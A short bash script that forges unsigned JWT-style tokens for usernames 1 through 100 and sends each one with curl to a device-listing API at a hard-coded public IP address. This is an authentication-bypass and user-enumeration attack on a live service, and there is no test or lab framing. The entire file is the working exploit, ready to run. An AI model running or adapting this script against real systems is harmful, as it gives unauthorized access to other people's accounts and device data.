#!/bin/bash
#
# vim:ft=sh

############### Variables ###############

############### Functions ###############

############### Main Part ###############

QSTAMP_API_URL="http://1.116.190.119/traffic/api/v2"
header=eyJhbGciOiJIUzI1NiJ9 # {"alg":"HS256"}

for i in {1..100}
do
    s="{\"exp\":2651142279,\"username\":\"$i\"}"
    payload=$(echo -n $s | basenc --base64url)
    payload=${payload%%=*}
    token=$header.$payload.
    echo uid: $i, token: $token

    api=device/list
    curl -H "tToken: $token" "$QSTAMP_API_URL/$api"
    echo 

    sleep 1
done

